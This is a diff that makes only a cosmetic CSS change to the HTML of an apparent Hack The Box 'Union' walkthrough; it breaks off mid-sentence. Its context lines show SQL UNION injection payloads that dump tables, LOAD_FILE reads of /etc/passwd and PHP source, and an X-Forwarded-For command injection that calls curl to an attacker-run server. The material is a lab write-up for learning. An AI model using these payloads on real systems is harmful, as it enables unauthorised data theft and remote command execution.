@@ -237,7 +237,7 @@
 <h3 id="nmap">NMAP:</h3>
 <h4 id="basic-scans">Basic Scans:</h4>
 <p><strong>TCP</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>nmap $box -Pn -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -253,7 +253,7 @@
 </ul>
 <p>Only 80 open so we are going after that it would appear.</p>
 <h4 id="comprehensive-scans">Comprehensive Scans:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
 </span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">(</span>...loodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Union/scans/nmap<span style="color:#f92672">)</span>───<span style="color:#f92672">(</span>kali@kali:pts/3<span style="color:#f92672">)</span>─┐
@@ -297,7 +297,7 @@
 <h4 id="whatweb">WhatWeb:</h4>
 <p>Lets run <a href="https://github.com/urbanadventurer/WhatWeb"  target="_blank" rel="noreferrer nofollow">WhatWeb</a>
  to see if I can glean some further information.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>whatweb http://$box | sed <span style="color:#e6db74">&#39;s/, /\n/g&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Output</span>
@@ -320,7 +320,7 @@
 </ul>
 <h4 id="dirbusting-the-webserver-running-using-ffuf">Dirbusting The Webserver Running Using FFUF:</h4>
 <p>We can perform some directory busting to see if there are any interesting directories.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic
 </span></span></code></pre></div><ul>
 <li>Nothing of value was found.</li>
 </ul>
@@ -341,7 +341,7 @@
 </p>
 </p>
 <p>Looking at the code for the function on the page, by using inspect, we can see it&rsquo;s a <code>POST</code> request that sends the data string <code>player=</code> + the string provided by the user using string concatenation. This unsanitized user input is being sent to <code>index.php</code>, which could potentially lead to SQL injection if the server-side code constructs database queries using this parameter without proper sanitization.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">function</span> () {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>  <span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">function</span> () {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;form&#39;</span>).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
 </span></span><span style="display:flex;"><span>
@@ -363,7 +363,7 @@
 <h3 id="using-an-sql-union-injection-attack-to-enumerate-the-database">Using An SQL Union Injection Attack To Enumerate The Database:</h3>
 <p>As we know the player string is being passed with string concatenation to construct it we can use this as a means to append another query onto the this query to enumerate the database.</p>
 <p>I used the standard query below to enumerate the version of SQL being run.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT @@version#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT @@version#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-074219_.png" alt=""  />
 </p>
@@ -373,12 +373,12 @@ If you are not familiar with SQLi UNION injection attacks here is a very brief o
 <h4 id="side-quest-what-is-the-union-operator-in-sql">Side Quest: What is the UNION operator in SQL?</h4>
 <p>The <code>UNION</code> operator allows us to combine two queries together. We can use it to add a malicious query to the end of a legitimate query used by the system.</p>
 <p>For example we can assume from the code we have seen that our user input is taken in the &ldquo;Player Eligibility Check&rdquo; box and then run against the database using a query similar to the below (this is speculation, we cannot know the exact query being run, but we can infer).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">--Command
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">--Command
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> player <span style="color:#66d9ef">FROM</span> eligiblePlayers <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[ourInput]&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">--Example
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> player <span style="color:#66d9ef">FROM</span> eligiblePlayers <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test&#39;</span>
 </span></span></code></pre></div><p>We can then use the <code>UNION</code> operator to append a query onto this legitimate query.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">--Command
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">--Command
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT [ourQuery]#
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--Example
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SELECT player FROM eligiblePlayers WHERE name = &#39;&#39; UNION SELECT @@version#
@@ -432,7 +432,7 @@ If you are not familiar with SQLi UNION injection attacks here is a very brief o
 </ol>
 <p>Since we’ve already successfully output the database version number, we know the original query has only one column. But let’s verify that by testing.</p>
 <p>To verify this we can run the below query.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL#
 </span></span></span></code></pre></div><p><code>NULL</code> is a safe choice here because it can be implicitly cast to any data type, meaning it won’t cause type mismatch errors during testing. And as we can see from requirement 2 we need &ldquo;Compatible data types&rdquo;.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-081742_.png" alt=""  />
@@ -440,7 +440,7 @@ If you are not familiar with SQLi UNION injection attacks here is a very brief o
 </p>
 <p>The response says we are &ldquo;not eligible due to already qualifying.”, which is odd, right? Most likely, the <code>NULL</code> value is being cast to a string and checked against a list of player names (our assumed target table).</p>
 <p>Lets add another <code>NULL</code> to see if there is a second column (we know there is not but let&rsquo;s do this so you can see what is happening.)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULl#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULl#
 </span></span></span></code></pre></div><figure><img src="/ox-hugo/2025-08-10-082009_.png">
 </figure>
 
@@ -450,7 +450,7 @@ If you are not familiar with SQLi UNION injection attacks here is a very brief o
 <p>Most databases, apart from Oracle, provide a special set of read-only views called the Information Schema. These contain metadata about the database such as tables, columns, etc. Oracle however, uses a different set of views (<code>ALL_TABLES</code>, <code>USER_TABLES</code>, <code>DBA_TABLES</code>).</p>
 <p>We can use these views to view all the tables (and other information the database contains).</p>
 <p>We can view the tables in the database by running the following query.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT TABLE_NAME FROM information_schema.tables#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT TABLE_NAME FROM information_schema.tables#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-083203_.png" alt=""  />
 </p>
@@ -465,18 +465,18 @@ As we can see there is a table called <code>ADMINISTRABLE_ROLE_AUTHORIZATIONS</c
 <h4 id="using-group-concat-to-view-all-tables">Using <code>GROUP_CONCAT()</code> to view all tables:</h4>
 <p>As you saw there are lots of built in tables.</p>
 <p>One option for us to view all the tables is use the <code>LIMIT 1 OFFSET</code> option.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 0#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 0#
 </span></span></span></code></pre></div><figure><img src="/ox-hugo/2025-08-10-102834_.png">
 </figure>
 
 <p>We can then increment the offset by a value of 1 to step through the list of tables.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 1#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 1#
 </span></span></span></code></pre></div><figure><img src="/ox-hugo/2025-08-10-102905_.png">
 </figure>
 
 <p>However that is going to take a LONG time and we would need to step through all the inbuilt tables still or guess where they end.</p>
 <p>Instead we can use the <code>GROUP_CONCAT()</code> function, which will allow us to group all the table names together concatenating them into one output, which is good as we have one cell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-103147_.png" alt=""  />
 </p>
@@ -488,12 +488,12 @@ As we can see the string extends beyond the bounds of the site; if we take a loo
 
 You may notice though near the end that there is a string that says &ldquo;ROUTI&rdquo; this is due to the fact that the <code>GROUP_CONCAT()</code>, in MySQL function having a default character limit length of 1024 characters.</p>
 <p>+Note+: If the database account has the required permissions, this limit can be increased to capture more results in a single output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">SESSION</span> group_concat_max_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">32768</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">SESSION</span> group_concat_max_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">32768</span>;
 </span></span></code></pre></div><p>This can be especially helpful in CTFs or lab environments, but is less likely to work in hardened production systems.</p>
 <p>You can also see that we have not even gotten past the inbuilt tables still.</p>
 <p>Luckily we can further refine this statement to exclude all built in tables by using the <code>NOT IN</code> clause.</p>
 <p>In MySQL, the <code>table_schema</code> column in <code>information_schema.tables</code> represents the database schema that each table belongs to. By excluding the system schemas, <code>mysql</code>, <code>information_schema</code>, <code>performance_schema</code> and <code>sys</code> we can filter the results down to only user created tables.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables  WHERE table_schema NOT IN (&#39;</span>mysql<span style="color:#e6db74">&#39;, &#39;</span>information_schema<span style="color:#e6db74">&#39;, &#39;</span>performance_schema<span style="color:#e6db74">&#39;, &#39;</span>sys<span style="color:#e6db74">&#39;)#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables  WHERE table_schema NOT IN (&#39;</span>mysql<span style="color:#e6db74">&#39;, &#39;</span>information_schema<span style="color:#e6db74">&#39;, &#39;</span>performance_schema<span style="color:#e6db74">&#39;, &#39;</span>sys<span style="color:#e6db74">&#39;)#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-103732_.png" alt=""  />
 </p>
@@ -501,14 +501,14 @@ You may notice though near the end that there is a string that says &ldquo;ROUTI
 As you can see there are only two non default tables, <code>flag</code> &amp; <code>players</code></p>
 <h3 id="enumerating-column-names-in-player-and-flag-tables">Enumerating Column Names In Player &amp; Flag Tables:</h3>
 <p>Again we can use the <code>GROUP_CONCAT()</code> function to extract all column names at once.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = &#39;</span>flag<span style="color:#e6db74">&#39;#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = &#39;</span>flag<span style="color:#e6db74">&#39;#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-104216_.png" alt=""  />
 </p>
 
 We can see there is a column called <code>one</code></p>
 <p>Let&rsquo;s check the <code>players</code> table columns now.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = &#39;</span>players<span style="color:#e6db74">&#39;#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = &#39;</span>players<span style="color:#e6db74">&#39;#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-104315_.png" alt=""  />
 </p>
@@ -517,14 +517,14 @@ We can see this has a single column called <code>player</code></p>
 <p>Let&rsquo;s read the contents of these columns.</p>
 <h3 id="extracting-data-from-the-database-columns-via-union-injection">Extracting Data From The Database Columns Via Union Injection?</h3>
 <p>Again we can use the <code>GROUP_CONCAT()</code> function to extract all the data from the columns also.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(player) FROM players#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(player) FROM players#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-152609_.png" alt=""  />
 </p>
 
 We can see it contains a list of registered players, we will take a note of these for later in case we need them.</p>
 <p>Let&rsquo;s check the flag column data now.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(one) FROM flag#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(one) FROM flag#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-152928_.png" alt=""  />
 </p>
@@ -552,7 +552,7 @@ We are given ssh access to the box.</p>
 <p>Let&rsquo;s see if we can read any of the files on the host via sqli.</p>
 <h3 id="reading-host-files-via-sqli">Reading Host Files VIA SQLi:</h3>
 <p>First lets establish if we can read from the host via the db, we will use a world readable file to do this, <code>/etc/passwd</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#34;/etc/passwd&#34;)#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#34;/etc/passwd&#34;)#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-154719_.png" alt=""  />
 </p>
@@ -562,7 +562,7 @@ We can read from the host!</p>
 <h3 id="enumerating-the-web-directory">Enumerating The Web Directory:</h3>
 <p>As this is running <code>nginx</code> the typical folder structure for storing files is <code>/var/www/html/[file].php</code></p>
 <p>Sending the payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#34;/var/www/html/index.php&#34;)#
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#34;/var/www/html/index.php&#34;)#
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-10-155241_.png" alt=""  />
 </p>
@@ -570,12 +570,12 @@ We can read from the host!</p>
 We can see that there is some SQLMap mitigation logic as well as the actual query being run on the database.</p>
 <p>Let&rsquo;s fuzz this to see what else we can find.</p>
 <p>First we will grab the relevant headers and cookies from the request.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">&#34;X-Requested-With: XMLHttpRequest&#34;</span> <span style="color:#ae81ff">\
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">&#34;X-Requested-With: XMLHttpRequest&#34;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#34;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Cookie: PHPSESSID=vdtvo4k8cnj42f08tq2fj7kcb0&#34;</span> <span style="color:#ae81ff">\
 </span></span></span></code></pre></div><p>We do this as the PHPSESSID is required in order for us to interact with the</p>
 <p>We can now construct our ffuf command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf <span style="color:#ae81ff">\
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>-w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-words.txt:FUZZ <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>-u http://$box/index.php <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>-x http://127.0.0.1:8080 <span style="color:#ae81ff">\
@@ -632,7 +632,7 @@ They do.</p>
 <p>Let&rsquo;s go back to what we do know, the files in the web directory.</p>
 <h3 id="finding-a-sudo-call-in-firewall-dot-php">Finding A Sudo Call in <code>firewall.php</code>:</h3>
 <p>Looking at <code>firewall.php</code> we can see the below lines.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
 </span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
 </span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
@@ -656,10 +656,10 @@ Because the <code>X-Forwarded-For</code> header is controlled by the client, whi
 <p>For a simple POC we are going to use a curl command to grab the contents of a python http server we control.</p>
 <h4 id="setup-our-server">Setup our Server:</h4>
 <p>First of all lets setup our python http server.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">9000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">9000</span>
 </span></span></code></pre></div><h4 id="crafting-the-malicious-payload">Crafting The Malicious Payload:</h4>
 <p>The vulnerable PHP code runs:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> <span style="color:#f92672">.</span> $ip <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; -j ACCEPT&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> <span style="color:#f92672">.</span> $ip <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; -j ACCEPT&#34;</span>);
 </span></span></code></pre></div><p>Since <code>$ip</code> comes directly from the <code>X-Forwarded-For</code> header, we can inject extra commands after a valid IP address.</p>
 <p>We want to run:
 <code>curl http://[ourServer]:9000/POC</code></p>
@@ -697,7 +697,7 @@ This ensures the <code>iptables</code> command completes as intended:
 </li>
 </ol>
 <p>When the PHP code runs, the final system command looks like this:</p>
